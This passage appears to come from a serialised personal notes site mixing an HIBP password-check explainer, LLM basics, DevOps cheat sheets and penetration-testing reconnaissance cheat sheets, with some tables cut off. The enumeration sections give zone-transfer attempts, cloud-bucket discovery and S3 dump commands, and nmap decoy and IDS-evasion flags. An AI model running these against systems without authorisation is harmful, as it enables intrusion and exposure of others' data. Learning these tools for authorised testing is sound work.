check_breach(password):\nsha1 = hashlib.sha1(password.encode()).hexdigest().upper()\nprefix, suffix = sha1[:5], sha1[5:]</p>\n<pre><code>resp = requests.get(\n    f\"https://api.pwnedpasswords.com/range/{prefix}\"\n)\n\nfor line in resp.text.splitlines():\n    h, count = line.split(\":\")\n    if h == suffix:\n        return f\"Breached {count} times!\"\nreturn \"Not found in any known breaches\"\n</code></pre>\n<h1>Try it</h1>\n<p>print(check_breach(\"password123\"))\n`} /></p>\n<p><ideanode color=\"green\">Your password never leaves your device. The server sees a 5-char hash prefix out of a 40-char hash — impossible to reverse to the original password.</ideanode></p>\n<h2>Why this is brilliant</h2>\n<p><strong>Privacy:</strong> 5 hex chars of a hash reveal nothing about the original password. The server can't even tell WHICH hash you're checking — it returns all of them in that prefix bucket.</p>\n<p><strong>Speed:</strong> Pre-sorted indexed database. Direct lookup, no scanning through millions of records. The response is ~500 lines, transfer size under 20KB.</p>\n<p><strong>No local database needed:</strong> You don't need to download hundreds of millions of breached password hashes to your device. The server does the heavy lifting; your device just checks one hash.</p>\n<p>&#x3C;QuizCard\ntitle=\"Quick Check\"\ncolor=\"#ff2d95\"\nquestions={[\n{\nquestion: \"What gets sent to the Have I Been Pwned server?\",\noptions: [\n\"First 5 characters of SHA-1 hash\",\n\"The actual password\",\n\"The full SHA-1 hash\",\n\"An encrypted copy of the password\"\n],\ncorrect: 0,\nexplanation: \"Only the first 5 hex characters of the SHA-1 hash are sent. The server returns all matching suffixes — you compare the full hash locally.\"\n},\n{\nquestion: \"Why 5 characters specifically?\",\noptions: [\n\"16^5 approx 1M prefixes — enough anonymity, fast enough network transfer\",\n\"5 is a prime number\",\n\"SHA-1 hashes are always 5 chars\",\n\"The inventor's birthday was May 5th\"\n],\ncorrect: 0,\nexplanation: \"5 hex chars = 1,048,576 possible prefixes. Each prefix bucket contains hundreds of hashes (privacy), but the response is small enough for fast transfer.\"\n}\n]}\n/></p>","rag-vs-finetuning":"<p>Someone asked me \"why build a RAG pipeline instead of just fine-tuning the model on security data?\" I said \"good point\" and then spent a week building the RAG anyway. Here's what I figured out.</p>\n<p><ideanode color=\"blue\"><strong>The short answer:</strong> RAG for facts that change. Fine-tuning for behavior that shouldn't.</ideanode></p>\n<h2>What they actually do</h2>\n<p>| | Fine-tuning | RAG |\n|</p>","tokens-quantization-context":"<p>Three things that people throw around constantly when talking about LLMs that I nodded along with for way too long before actually figuring out what they meant.</p>\n<h2>Tokens</h2>\n<p>A token is not a word. It's closer to a word <em>fragment</em>. The model breaks text into chunks using a vocabulary it learned during training, and those chunks are tokens. Common words are usually one token. Rare words get split. Punctuation, spaces, and code get treated differently.</p>\n<p>\"Hello world\" → <code>[\"Hello\", \" world\"]</code> → 2 tokens<br>\n\"Subterranean\" → <code>[\"Sub\", \"terr\", \"ane\", \"an\"]</code> → 4 tokens<br>\n\"😂\" → 1-3 tokens depending on the tokenizer</p>\n<p>Why does this matter? Because everything in LLMs is measured in tokens. Context window (how much the model can \"remember\") is in tokens. Speed is measured in tokens per second. Cost, if you're using an API, is per token. A rough rule of thumb: 1 token ≈ 0.75 words in English, so a 128k context window holds roughly 96,000 words, which is about a novel.</p>\n<p>The model never sees your raw text. It sees numbers — the token IDs. \"Hello\" maps to token 9906 or something. The whole language is compressed into a vocabulary of 32k-128k tokens, and everything the model reads and writes flows through that vocabulary.</p>\n<h2>Context Window</h2>\n<p>The context window is how much text the model can hold in \"working memory\" at once. Not long-term memory — it doesn't remember past conversations. Just the current one.</p>\n<p>When you're five messages into a Goose session and the agent has already run nmap, analyzed the output, queried Qdrant, and started planning next steps, all of that is sitting in the context window. Every token of it. When you hit the limit, the model starts forgetting the earliest parts, which is why long sessions go weird — it literally can't see what it did 10,000 tokens ago.</p>\n<p>The KV cache is what stores all this. For each token in context, the model stores intermediate computation results (K and V matrices, hence \"KV\") so it doesn't have to recompute from scratch every time. This is what eats VRAM as context grows.</p>\n<p>Most modern models support 128k+ tokens. Whether that's actually usable depends on how well the model was trained on long contexts. Some models are trained with 128k context but start losing coherence past 32k. The Qwen family is genuinely good at long context — I've pushed it to 64k without obvious degradation.</p>\n<h2>Quantization</h2>\n<p>This is the one I had half-right. My mental model was \"Q8 stores numbers with more decimal places than Q4\" which is basically correct but let me explain properly.</p>\n<p>Model weights are just numbers. After training, they're stored as 32-bit or 16-bit floating point numbers (FP32 or FP16). FP16 is already a compression from FP32. A 27B parameter model in FP16 would be:</p>\n<p>27,000,000,000 × 2 bytes = <strong>54GB</strong></p>\n<p>That doesn't fit in any consumer GPU. Quantization is the process of converting those weights to use fewer bits — trading precision for size.</p>\n<p><strong>Q8</strong> (8-bit integer): Each weight gets stored in 8 bits instead of 16. Half the size. Quality loss is nearly imperceptible. 27B model ≈ 27GB.</p>\n<p><strong>Q4</strong> (4-bit integer): Each weight in 4 bits. Quarter the original size. 27B model ≈ 14-18GB. Noticeable quality loss on very precise tasks, but for conversation and reasoning it's fine.</p>\n<p><strong>Q2</strong> (2-bit): Getting rough. 27B model ≈ 7-9GB. Models start sounding confused. Not recommended unless you absolutely have to.</p>\n<p>The K_M, K_S, K_P, K_XL suffixes in GGUF filenames? Those describe how the quantization is applied across different parts of the model. Some layers are more sensitive to precision loss than others. K_M is a balanced mixed-precision quantization, K_P is slightly higher quality (some layers stay at higher precision), K_XL prioritizes quality. In practice: if you're unsure, grab Q4_K_M or Q4_K_P.</p>\n<p>Your analogy about floating point precision is actually close: in Q8, a weight that was <code>1.98765432</code> might become <code>1.988</code>. In Q4, it might be stored as <code>2.0</code>. The model has billions of these so the approximation errors mostly average out — but you can definitely feel it on tasks requiring precise reasoning at the extremes.</p>\n<p>The format (GGUF in llama.cpp, safetensors for HuggingFace) is separate from quantization. GGUF is just the container format that includes the tokenizer, metadata, and quantized weights all in one file. Very convenient.</p>\n<h2>The practical guide</h2>\n<p>If you have 24GB VRAM:</p>\n<ul>\n<li>70B models: need Q2-Q3, quality suffers, not worth it</li>\n<li>27B-34B models: Q4_K_P or Q4_K_M, runs great, looks good</li>\n<li>13B models: Q6_K or even Q8, excellent quality</li>\n<li>7-9B models: fits at Q8 or even FP16 if you squeeze</li>\n</ul>\n<p>The jump from Q4 to Q8 is usually worth it when the model fits. The jump from Q8 to FP16 is usually not — you're paying double the VRAM for marginal improvement. Q4 to Q3 is where things start getting noticeable. Don't go below Q4 unless you're desperate.</p>","DevOps/Git":"<h4>1. Clone</h4>\n<accordion title=\"git clone: Clone a repository into a new directory\">\nClone a Git repository from a remote source to your local machine.\n<br>\n<pre><code class=\"language-bash\">git clone repository_url\n</code></pre>\n</accordion>\n<h4>2. Init</h4>\n<accordion title=\"git init: Create an empty Git repository or reinitialize an existing one\">\nInitialize a new Git repository for a project or reinitialize an existing one.\n<br>\n<pre><code class=\"language-bash\">git init\n</code></pre>\n</accordion>\n<h4>3. Add</h4>\n<accordion title=\"git add: Add file contents to the index for the next commit\">\nStage changes for the next commit by adding modified or new files.\n<br>\n<pre><code class=\"language-bash\">git add file_name\n</code></pre>\n</accordion>\n<h4>4. Commit</h4>\n<accordion title=\"git commit: Record changes to the repository\">\nSave staged changes to the local repository with a descriptive commit message.\n<br>\n<pre><code class=\"language-bash\">git commit -m \"Your commit message\"\n</code></pre>\n</accordion>\n<h4>5. Status</h4>\n<accordion title=\"git status: Show the working tree status\">\nView the status of your working directory and see changes that need to be committed.\n<br>\n<pre><code class=\"language-bash\">git status\n</code></pre>\n</accordion>\n<h4>6. Diff</h4>\n<accordion title=\"git diff: Show changes between commits, commit and working tree, etc\">\nDisplay the differences between various states, such as commits and the working tree.\n<br>\n<pre><code class=\"language-bash\">git diff\n</code></pre>\n</accordion>\n<h4>7. Log</h4>\n<accordion title=\"git log: Show the commit logs\">\nView a chronological log of commits with their hashes, authors, dates, and messages.\n<br>\n<pre><code class=\"language-bash\">git log\n</code></pre>\n</accordion>\n<h4>8. Branch</h4>\n<accordion title=\"git branch: List, create, or delete branches\">\nManage branches in your Git repository - list, create, or delete branches.\n<br>\n<pre><code class=\"language-bash\">git branch branch_name\n</code></pre>\n</accordion>\n<h4>9. Checkout</h4>\n<accordion title=\"git checkout: Switch branches or restore working tree files\">\nMove between branches or restore files to a previous state.\n<br>\n<pre><code class=\"language-bash\">git checkout branch_name\n</code></pre>\n</accordion>\n<h4>10. Merge</h4>\n<accordion title=\"git merge: Join two or more development histories together\">\nCombine changes from different branches into the current branch.\n<br>\n<pre><code class=\"language-bash\">git merge branch_name\n</code></pre>\n</accordion>\n<h4>11. Remote</h4>\n<accordion title=\"git remote: Manage set of tracked repositories\">\nConfigure connections to remote repositories where your code is stored.\n<br>\n<pre><code class=\"language-bash\">git remote add origin repository_url\n</code></pre>\n</accordion>\n<h4>12. Fetch</h4>\n<accordion title=\"git fetch: Download objects and refs from another repository\">\nRetrieve changes from a remote repository without merging them into your working directory.\n<br>\n<pre><code class=\"language-bash\">git fetch origin\n</code></pre>\n</accordion>\n<h4>13. Pull</h4>\n<accordion title=\"git pull: Fetch from and integrate with another repository or a local branch\">\nFetch changes from a remote repository and integrate them into your current branch.\n<br>\n<pre><code class=\"language-bash\">git pull origin branch_name\n</code></pre>\n</accordion>\n<h4>14. Push</h4>\n<accordion title=\"git push: Update remote refs along with associated objects\">\nSend your committed changes to a remote repository.\n<br>\n<pre><code class=\"language-bash\">git push origin branch_name\n</code></pre>\n</accordion>\n<h4>15. Reset</h4>\n<accordion title=\"git reset: Reset current HEAD to the specified state\">\nUnstage changes or move the current branch to a specific commit.\n<br>\n<pre><code class=\"language-bash\">git reset commit_hash\n</code></pre>\n</accordion>\n<h4>16. Revert</h4>\n<accordion title=\"git revert: Create new commit that undoes changes to the previous commit\">\nReverse the changes introduced by a specific commit by creating a new commit.\n<br>\n<pre><code class=\"language-bash\">git revert commit_hash\n</code></pre>\n</accordion>\n<h4>17. Tag</h4>\n<accordion title=\"git tag: Create, list, delete, or verify a tag object signed with GPG\">\nMark specific commits as releases by creating lightweight or annotated tags.\n<br>\n<pre><code class=\"language-bash\">git tag -a v1.0 -m \"Release version 1.0\"\n</code></pre>\n</accordion>\n<h4>18. Cherry-Pick</h4>\n<accordion title=\"git cherry-pick: Apply the changes introduced by some existing commits\">\nSelect and apply specific commits from one branch to another.\n<br>\n<pre><code class=\"language-bash\">git cherry-pick commit_hash\n</code></pre>\n</accordion>\n<h4>19. Stash</h4>\n<accordion title=\"git stash: Stash the changes in a dirty working directory away\">\nTemporarily save changes that are not ready to be committed.\n<br>\n<pre><code class=\"language-bash\">git stash save \"Your stash message\"\n</code></pre>\n</accordion>\n<h4>20. Help</h4>\n<accordion title=\"git help: Display help information\">\nAccess Git's built-in documentation to get information about Git commands.\n<br>\n<pre><code class=\"language-bash\">git help command_name\n</code></pre>\n</accordion>","DevOps/Kubernetes":"<h4>1. Deploy a Pod</h4>\n<accordion title=\"kubectl run: Create and run a pod\">\nDeploy a simple pod with a specified image.\n<br>\n<pre><code class=\"language-bash\">kubectl run mypod --image=nginx\n</code></pre>\n</accordion>\n<h4>2. List Pods</h4>\n<accordion title=\"kubectl get pods: List all pods in the current namespace\">\nView the status of all pods running in the current namespace.\n<br>\n<pre><code class=\"language-bash\">kubectl get pods\n</code></pre>\n</accordion>\n<h4>3. Pod Details</h4>\n<accordion title=\"kubectl describe pod: Display detailed information about a pod\">\nRetrieve comprehensive information about a specific pod.\n<br>\n<pre><code class=\"language-bash\">kubectl describe pod pod_name\n</code></pre>\n</accordion>\n<h4>4. Scale a Deployment</h4>\n<accordion title=\"kubectl scale: Scale the number of replicas in a deployment\">\nAdjust the number of replicas for a deployment.\n<br>\n<pre><code class=\"language-bash\">kubectl scale deployment myapp --replicas=3\n</code></pre>\n</accordion>\n<h4>5. Expose a Service</h4>\n<accordion title=\"kubectl expose: Create a service and expose it to external traffic\">\nExpose a service to make it accessible from outside the cluster.\n<br>\n<pre><code class=\"language-bash\">kubectl expose deployment myapp --port=80 --type=LoadBalancer\n</code></pre>\n</accordion>\n<h4>6. Update a Deployment</h4>\n<accordion title=\"kubectl set image: Update the image of a deployment\">\nRoll out a new image for a deployment.\n<br>\n<pre><code class=\"language-bash\">kubectl set image deployment/myapp myapp-container=myapp:v2\n</code></pre>\n</accordion>\n<h4>7. Pod Logs</h4>\n<accordion title=\"kubectl logs: Display logs from a pod\">\nRetrieve logs from a specific pod.\n<br>\n<pre><code class=\"language-bash\">kubectl logs pod_name\n</code></pre>\n</accordion>\n<h4>8. Delete a Pod</h4>\n<accordion title=\"kubectl delete pod: Remove a pod\">\nTerminate and delete a specific pod.\n<br>\n<pre><code class=\"language-bash\">kubectl delete pod pod_name\n</code></pre>\n</accordion>\n<h4>9. List Services</h4>\n<accordion title=\"kubectl get services: List all services in the current namespace\">\nView details of all services running in the current namespace.\n<br>\n<pre><code class=\"language-bash\">kubectl get services\n</code></pre>\n</accordion>\n<h4>10. Service Details</h4>\n<accordion title=\"kubectl describe service: Display detailed information about a service\">\nRetrieve comprehensive information about a specific service.\n<br>\n<pre><code class=\"language-bash\">kubectl describe service service_name\n</code></pre>\n</accordion>\n<h4>11. Delete a Service</h4>\n<accordion title=\"kubectl delete service: Remove a service\">\nDelete a specific service.\n<br>\n<pre><code class=\"language-bash\">kubectl delete service service_name\n</code></pre>\n</accordion>\n<h4>12. Config Maps</h4>\n<accordion title=\"kubectl create configmap: Create a config map\">\nCreate a config map to store configuration data.\n<br>\n<pre><code class=\"language-bash\">kubectl create configmap config-map-name --from-file=path/to/config/files\n</code></pre>\n</accordion>\n<h4>13. Secrets</h4>\n<accordion title=\"kubectl create secret: Create a secret\">\nCreate a secret to store sensitive information.\n<br>\n<pre><code class=\"language-bash\">kubectl create secret generic secret-name --from-literal=key=value\n</code></pre>\n</accordion>\n<h4>14. Get Nodes</h4>\n<accordion title=\"kubectl get nodes: List all nodes in the cluster\">\nView information about all nodes in the Kubernetes cluster.\n<br>\n<pre><code class=\"language-bash\">kubectl get nodes\n</code></pre>\n</accordion>\n<h4>15. Namespace Creation</h4>\n<accordion title=\"kubectl create namespace: Create a new namespace\">\nEstablish a new namespace for organizing resources.\n<br>\n<pre><code class=\"language-bash\">kubectl create namespace my-namespace\n</code></pre>\n</accordion>","DevOps/docker":"<p>Every Docker command you need, organized by operation. Copy buttons included so you never type a command twice.</p>\n<p><brutalbutton color=\"#0055ff\">Container Lifecycle Below</brutalbutton></p>\n<h2>Image Management</h2>\n<accordion title=\"docker build — Build an image from a Dockerfile\" color=\"#0055ff\">\n```bash\ndocker build -t my-image:latest .\n```\n<copybutton text=\"docker build -t my-image:latest .\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"docker pull — Download an image from a registry\" color=\"#0055ff\">\n```bash\ndocker pull nginx:alpine\n```\n<copybutton text=\"docker pull nginx:alpine\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"docker images — List all local images\" color=\"#0055ff\">\n```bash\ndocker images\n```\n<copybutton text=\"docker images\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"docker rmi — Remove an image\" color=\"#0055ff\">\n```bash\ndocker rmi image_id\ndocker image prune -a\n```\n<copybutton text=\"docker image prune -a\" label=\"Copy prune\">\n</copybutton></accordion>\n<accordion title=\"docker tag — Tag an image\" color=\"#0055ff\">\n```bash\ndocker tag my-image:latest registry.example.com/my-image:v1.0\n```\n<copybutton text=\"docker tag my-image:latest registry.example.com/my-image:v1.0\" label=\"Copy\">\n</copybutton></accordion>\n<h2>Container Lifecycle</h2>\n<accordion title=\"docker run — Run a container\" color=\"#00cc55\">\n```bash\ndocker run -d -p 8080:80 --name webserver nginx\n```\n<copybutton text=\"docker run -d -p 8080:80 --name webserver nginx\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"docker ps — List running containers\" color=\"#00cc55\">\n```bash\ndocker ps\ndocker ps -a  # including stopped\n```\n<copybutton text=\"docker ps -a\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"docker stop / start / restart\" color=\"#00cc55\">\n```bash\ndocker stop container_name\ndocker start container_name\ndocker restart container_name\n```\n<copybutton text=\"docker stop container_name &#x26;&#x26; docker start container_name\" label=\"Copy restart\">\n</copybutton></accordion>\n<accordion title=\"docker rm — Remove a container\" color=\"#00cc55\">\n```bash\ndocker rm container_id\ndocker rm -f container_id  # force remove running\n```\n<copybutton text=\"docker rm -f container_id\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"docker exec — Run command inside running container\" color=\"#00cc55\">\n```bash\ndocker exec -it container_name /bin/bash\n```\n<copybutton text=\"docker exec -it container_name /bin/bash\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"docker logs — View container logs\" color=\"#00cc55\">\n```bash\ndocker logs -f container_name  # follow\ndocker logs --tail 50 container_name\n```\n<copybutton text=\"docker logs -f container_name\" label=\"Copy\">\n</copybutton></accordion>\n<h2>Volumes &#x26; Networks</h2>\n<accordion title=\"docker volume — Manage persistent data\" color=\"#7700ff\">\n```bash\ndocker volume create my_volume\ndocker run -v my_volume:/data nginx\n```\n<copybutton text=\"docker volume create my_volume\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"docker network — Manage networks\" color=\"#7700ff\">\n```bash\ndocker network create my_network\ndocker run --network my_network nginx\n```\n<copybutton text=\"docker network create my_network\" label=\"Copy\">\n</copybutton></accordion>\n<h2>Docker Compose</h2>\n<accordion title=\"docker compose — Multi-container orchestration\" color=\"#ff6600\">\n```bash\ndocker compose up -d\ndocker compose down\ndocker compose ps\ndocker compose logs -f\n```\n<copybutton text=\"docker compose up -d\" label=\"Copy up\">\n</copybutton></accordion>\n<h2>Cleanup</h2>\n<accordion title=\"System cleanup — Reclaim disk space\" color=\"#ff2244\">\n```bash\ndocker system prune -a --volumes\n```\n<copybutton text=\"docker system prune -a --volumes\" label=\"Copy\"> ⚠️ Destroys everything not in use!\n</copybutton></accordion>\n<p>&#x3C;QuizCard\ntitle=\"Docker Basics\"\ncolor=\"#0055ff\"\nquestions={[\n{\nquestion: \"Which flag runs a container in detached mode?\",\noptions: [\"-d\", \"-f\", \"-b\", \"-r\"],\ncorrect: 0,\nexplanation: \"-d (detach) runs the container in the background and returns the container ID.\"\n},\n{\nquestion: \"What does docker exec -it container /bin/bash do?\",\noptions: [\n\"Opens an interactive shell inside the running container\",\n\"Starts a new container from the image\",\n\"Copies /bin/bash from the container\",\n\"Deletes the container and starts bash\"\n],\ncorrect: 0,\nexplanation: \"exec runs a command inside an already-running container. -i (interactive) + -t (TTY) gives you a terminal.\"\n}\n]}\n/></p>","Enumeration/Dig_and_NSlookup":"<h1>Dig</h1>\n<h4>1. General lookup for all record types</h4>\n<pre><code class=\"language-bash\">dig target.com ANY\n</code></pre>\n<h4>2. Look for TXT records (SPF, DMARC, Domain Verifications)</h4>\n<pre><code class=\"language-bash\">dig target.com TXT\n</code></pre>\n<h4>3. Look for Mail Exchange servers (Email infrastructure)</h4>\n<pre><code class=\"language-bash\">dig target.com MX\n</code></pre>\n<h4>4. Query a specific Name Server directly</h4>\n<pre><code class=\"language-bash\">dig target.com @ns1.target.com\n</code></pre>\n<h4>5. Attempt a Zone Transfer (AXFR) - Pulls the entire DNS database if misconfigured</h4>\n<pre><code class=\"language-bash\">dig axfr target.com @ns1.target.com\n</code></pre>\n<h4>6. Short output (clean IP addresses only for automation)</h4>\n<pre><code class=\"language-bash\">dig target.com +short\n</code></pre>\n<h1>NSlookup</h1>\n<p>While <code>dig</code> is preferred on Linux, <code>nslookup</code> is pre-installed on every Windows machine and is essential for pivoting or when you only have access to a Windows shell.</p>\n<h2>Non-Interactive</h2>\n<h4>1. Basic IP lookup</h4>\n<pre><code class=\"language-bash\">nslookup target.com\n</code></pre>\n<h4>2. Reverse lookup (Who owns this IP?)</h4>\n<pre><code class=\"language-bash\">nslookup 1.1.1.1\n</code></pre>\n<h4>3. Query a specific record type (MX, TXT, NS, ANY)</h4>\n<pre><code class=\"language-bash\">nslookup -type=mx target.com\n</code></pre>\n<h4>4. Query using a specific DNS server (e.g., Google's 8.8.8.8)</h4>\n<pre><code class=\"language-bash\">nslookup target.com 8.8.8.8\n</code></pre>\n<h2>Interactive Mode (The Professional Way)</h2>\n<p>Type <code>nslookup</code> and hit enter to stay in the prompt. This allows for faster, repeated queries.</p>\n<h4>1. Change your current DNS server</h4>\n<pre><code class=\"language-bash\">server 8.8.8.8        \n</code></pre>\n<h4>2. Set all following queries to TXT records</h4>\n<pre><code class=\"language-bash\">set type=txt\n</code></pre>\n<h4>3. Perform the query</h4>\n<pre><code class=\"language-bash\">target.com \n</code></pre>\n<h4>4. Enable verbose output (shows full packet details)</h4>\n<pre><code class=\"language-bash\">set debug \n</code></pre>\n<h4>5. Attempt Zone Transfer (Windows-specific nslookup command)</h4>\n<pre><code class=\"language-bash\">ls -d target.com       \n</code></pre>","Enumeration/Dorking":"<h1>Google Dorking</h1>\n<p>|<strong>Operator</strong>|<strong>Purpose</strong>|<strong>Example</strong>|\n|</p>","Enumeration/Enumeration_Tools":"<h1>Subfinder</h1>\n<p>The fastest passive aggregator. It doesn't scan; it just asks other databases what they know.</p>\n<h4>1. Basic passive discovery</h4>\n<pre><code class=\"language-bash\">subfinder -d target.com -silent \n</code></pre>\n<h4>2. Discovery using wordlist</h4>\n<pre><code class=\"language-bash\">subfinder -d target.com -o subdomains.txt\n</code></pre>\n<h4>3. Aggregate from all sources and save to file</h4>\n<pre><code class=\"language-bash\">subfinder -d target.com -all -o subdomains.txt\n</code></pre>\n<h1>Amass</h1>\n<p>It uses a graph database to map relationships between IPs, domains, and ASNs for deep passive mapping.</p>\n<h4>1. Passive mode (stealthy)</h4>\n<pre><code class=\"language-bash\">amass enum -passive -d target.com\n</code></pre>\n<h4>2. Active mode (brute forcing and resolving)</h4>\n<pre><code class=\"language-bash\">amass enum -active -d target.com -brute -w /path/to/wordlist.txt\n</code></pre>\n<h1>BBOT (BBN-OSINT)</h1>\n<p>It intelligently correlates data rather than just listing it.</p>\n<h4>1. Deep subdomain enumeration with passive flags</h4>\n<pre><code class=\"language-bash\">bbot -t target.com -p subdomain-enum -rf passive\n</code></pre>\n<h1>Assetfinder</h1>\n<p>Go-based passive subdomain scraper</p>\n<pre><code class=\"language-bash\">assetfinder --subs-only target.com > subdomains.txt\n</code></pre>\n<h1>CloudBrute</h1>\n<p>Used to find company infrastructure across AWS, Azure, and Google Cloud.</p>\n<h4>1. Search for buckets, apps, and storage belonging to a company</h4>\n<pre><code class=\"language-bash\">cloudbrute -d target.com -k keyword_list.txt\n</code></pre>\n<h1>S3Scanner</h1>\n<p>Specifically targets misconfigured Amazon storage buckets.</p>\n<h4>1. Scan a list of potential bucket names</h4>\n<pre><code class=\"language-bash\">s3scanner scan --bucket-file buckets.txt\n</code></pre>\n<h1>Dump contents of an open bucket</h1>\n<pre><code class=\"language-bash\">s3scanner dump --bucket target-backup-2026\n</code></pre>","Enumeration/nmap":"<p>Nmap is the Swiss Army knife of network recon. Every flag here is battle-tested from real engagements.</p>\n<p><ideanode color=\"green\"><strong>Pro tip:</strong> Always start with <code>-sn</code> for host discovery, then <code>-sS</code> for stealth scan on live hosts. Don't blind-full-scan a /16 subnet.</ideanode></p>\n<h2>Host Discovery</h2>\n<accordion title=\"-sn — Ping scan (no port scan)\" color=\"#00cc55\">\nDiscovers live hosts using ICMP, TCP SYN/ACK, and ARP depending on privileges.\n```bash\nnmap -sn 10.129.2.0/24\n```\n<copybutton text=\"nmap -sn 10.129.2.0/24\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-Pn — Skip host discovery (treat all as up)\" color=\"#00cc55\">\nEssential when firewalls block ICMP. Forces port scan on every target regardless of ping.\n```bash\nnmap -Pn 10.129.2.47\n```\n<copybutton text=\"nmap -Pn 10.129.2.47\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-PE — ICMP Echo with packet trace\" color=\"#00cc55\">\nForce ICMP Echo and disable ARP ping for Layer 3 routing visibility.\n```bash\nnmap 10.129.2.47 -sn -PE --disable-arp-ping --packet-trace\n```\n<copybutton text=\"nmap 10.129.2.47 -sn -PE --disable-arp-ping --packet-trace\" label=\"Copy\">\n</copybutton></accordion>\n<h2>Scan Techniques</h2>\n<accordion title=\"-sS — TCP SYN scan (stealth, default as root)\" color=\"#ff2d95\">\nHalf-open scan — sends SYN, waits for SYN-ACK, never completes handshake. Faster and slightly stealthier.\n```bash\nsudo nmap -sS 10.129.2.47\n```\n<copybutton text=\"sudo nmap -sS 10.129.2.47\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-sT — TCP Connect scan (default without root)\" color=\"#ff2d95\">\nCompletes full 3-way handshake. Accurate but logged by target systems.\n```bash\nnmap -sT 10.129.2.47\n```\n<copybutton text=\"nmap -sT 10.129.2.47\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-sU — UDP scan\" color=\"#ff2d95\">\nScans UDP ports. Slow — combine with `--min-rate` for engagement speed.\n```bash\nsudo nmap -sU -p 53,161 10.129.2.47\n```\n<copybutton text=\"sudo nmap -sU -p 53,161 10.129.2.47\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-sV — Service version detection\" color=\"#ff2d95\">\nProbes open ports to determine service/version info.\n```bash\nnmap -sV -p 22,80,443 10.129.2.47\n```\n<copybutton text=\"nmap -sV -p 22,80,443 10.129.2.47\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-O — OS detection\" color=\"#ff2d95\">\nFingerprints the target operating system via TCP/IP stack analysis.\n```bash\nsudo nmap -O 10.129.2.47\n```\n<copybutton text=\"sudo nmap -O 10.129.2.47\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"-A — Aggressive mode\" color=\"#ff2d95\">\nEnables OS detection, version detection, script scanning, and traceroute. Noisy but comprehensive.\n```bash\nsudo nmap -A 10.129.2.47\n```\n<copybutton text=\"sudo nmap -A 10.129.2.47\" label=\"Copy\">\n</copybutton></accordion>\n<h2>Port Specification</h2>\n<accordion title=\"-p — Specify ports\" color=\"#ffdd00\">\n```bash\nnmap -p 22,80,443 target\nnmap -p 1-1000 target\nnmap -p- target    # all 65535 ports\nnmap --top-ports 100 target\n```\n<copybutton text=\"nmap -p- --min-rate 1000 target\" label=\"Copy full scan\">\n</copybutton></accordion>\n<h2>Performance &#x26; Evasion</h2>\n<accordion title=\"Timing templates (-T0 to -T5)\" color=\"#ff6600\">\n```bash\nnmap -T4 target   # aggressive timing (default T3)\nnmap -T2 target   # polite — for IDS evasion\n```\n<copybutton text=\"nmap -T4 -p- target\" label=\"Copy T4 full\">\n</copybutton></accordion>\n<accordion title=\"--min-rate — Minimum packets per second\" color=\"#ff6600\">\n```bash\nnmap --min-rate 5000 -p- target\n```\n<copybutton text=\"nmap --min-rate 5000 -p- target\" label=\"Copy\">\n</copybutton></accordion>\n<accordion title=\"Fragment packets + decoys\" color=\"#ff6600\">\n```bash\nnmap -f target                         # fragment packets\nnmap -D RND:5 target                   # 5 random decoys\nnmap -D 10.0.0.1,10.0.0.2 target      # specific decoys\n```\n<copybutton text=\"nmap -f -D RND:3 target\" label=\"Copy\">\n</copybutton></accordion>\n<h2>Output Formats</h2>\n<accordion title=\"-oN / -oG / -oX / -oA — Output formats\" color=\"#7700ff\">\n```bash\nnmap -oN normal.txt target     # human readable\nnmap -oG grepable.txt target   # grep-friendly\nnmap -oX xml.xml target        # XML (for tools)\nnmap -oA full target           # all formats\n```\n<copybutton text=\"nmap -sS -sV -oA scan_results target\" label=\"Copy\">\n</copybutton></accordion>\n<h2>NSE Scripting</h2>\n<accordion title=\"--script — NSE script engine\" color=\"#00e5ff\">\n```bash\nnmap --script vuln target\nnmap --script http-enum target\nnmap --script \"smb-*\" target\nnmap --script \"default,safe\" target\n```\n<copybutton text=\"nmap --script vuln,safe target\" label=\"Copy vuln scan\">\n</copybutton></accordion>\n<p>&#x3C;QuizCard\ntitle=\"Nmap Basics\"\ncolor=\"#00cc55\"\nquestions={[\n{\nquestion: \"Which scan type never completes the TCP 3-way handshake?\",\noptions: [\"-sS (SYN scan)\", \"-sT (Connect scan)\", \"-sU (UDP scan)\", \"-sA (ACK scan)\"],\ncorrect: 0,\nexplanation: \"SYN scan sends SYN, receives SYN-ACK, then sends RST instead of ACK — the handshake never completes.\"\n},\n{\nquestion: \"When would you use -Pn?\",\noptions: [\n\"When ICMP is blocked by a firewall\",\n\"When you want a faster scan\",\n\"When scanning UDP ports\",\n\"When running as non-root\"\n],\ncorrect: 0,\nexplanation: \"-Pn skips host discovery entirely. Use it when ping probes are blocked by firewalls and hosts appear 'down' even though they're up.\"\n}\n]}\n/></p>","Linux/Terminal_and_Shell":"<h4>1. Cursor Movement</h4>\n<accordion title=\"Fast Navigation\">\n* **Ctrl + a**: Jump to the **beginning** of the line.\n* **Ctrl + e**: Jump to the **end** of the line.\n* **Alt + f**: Move **forward** one word.\n* **Alt + b**: Move **backward** one word.\n* **Ctrl + xx**: Toggle cursor between start and current position.\n</accordion>\n<h4>2. Editing &#x26; Deleting</h4>\n<accordion title=\"Text Manipulation\">\n* **Ctrl + w**: Delete the **word** before the cursor.\n* **Alt + d**: Delete the **word** after the cursor.\n* **Ctrl + u**: Delete from cursor to **beginning** of line.\n* **Ctrl + k**: Delete from cursor to **end** of line.\n* **Ctrl + y**: **Yank** (paste) the last deleted text.\n* **Ctrl + _**: **Undo** your last edit.\n</accordion>\n<h4>3. Command History</h4>\n<accordion title=\"Retrieving Commands\">\n* **Ctrl + r**: Search command history (triggers Atuin if installed).\n* **Alt + .**: Insert the **last argument** of the previous command.\n* **!!**: Execute the **entire** last command again (e.g., `sudo !!`).\n* **!$**: Execute only the last argument of the previous command.\n</accordion>\n<h4>4. Screen 